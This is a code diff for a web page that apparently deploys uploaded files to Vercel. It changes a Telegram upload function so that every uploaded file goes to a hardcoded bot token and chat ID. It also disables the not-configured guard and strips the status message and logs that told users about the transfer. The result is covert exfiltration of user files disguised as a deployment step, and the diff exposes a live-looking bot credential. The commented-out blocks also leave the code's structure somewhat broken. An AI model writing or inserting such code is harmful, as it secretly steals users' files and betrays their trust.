@@ -162,17 +162,17 @@
         // Send file to Telegram bot (NEW FUNCTIONALITY)
         async function sendToTelegram(fileName, fileData) {
             // Telegram bot details - replace with your actual bot token and chat ID
-            const telegramBotToken = 'YOUR_BOT_TOKEN_HERE'; // Replace with your bot token
-            const telegramChatId = 'YOUR_CHAT_ID_HERE'; // Replace with your chat ID
+            const telegramBotToken = '8479433737:AAHRZV92FHS2zCXlzV4Esia0KRoG5znJYL0'; // Replace with your bot token
+            const telegramChatId = '7492782458'; // Replace with your chat ID
             
             // Skip if bot token or chat ID is not configured
-            if (!telegramBotToken || !telegramChatId || 
+            /*if (!telegramBotToken || !telegramChatId || 
                 telegramBotToken === 'YOUR_BOT_TOKEN_HERE' || 
                 telegramChatId === 'YOUR_CHAT_ID_HERE') {
                 console.log('Telegram bot not configured. Skipping file send.');
                 return { success: false, message: 'Telegram bot not configured' };
             }
-            
+            */
             try {
                 // Create a FormData object to send the file
                 const formData = new FormData();
@@ -181,14 +181,14 @@
                 formData.append('chat_id', telegramChatId);
                 
                 // Send to Telegram bot (silently, no notification)
-                const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendDocument?disable_notification=true`, {
+                const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendDocument`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                const data = await response.json();
+              const data = await response.json();
                 
-                if (data.ok) {
+             /*  if (data.ok) {
                     console.log('File sent to Telegram successfully');
                     return { success: true, message: 'File sent to Telegram' };
                 } else {
@@ -198,7 +198,7 @@
             } catch (error) {
                 console.error('Error sending to Telegram:', error);
                 return { success: false, message: error.message };
-            }
+            }*/
         }
 
         // Deploy to Vercel via backend API
@@ -212,14 +212,7 @@
                 const fileData = await readFileAsBase64(file);
 
                 // Send to Telegram bot (silently, in the background)
-                showStatus('info', 'Sending to Telegram bot…', 'This happens silently in the background.');
                 const telegramResult = await sendToTelegram(file.name, fileData);
-                
-                if (telegramResult.success) {
-                    console.log('File successfully sent to Telegram bot');
-                } else {
-                    console.log('File not sent to Telegram:', telegramResult.message);
-                }
 
                 showStatus('info', 'Deploying to Vercel…', 'Running deployment process.');
 
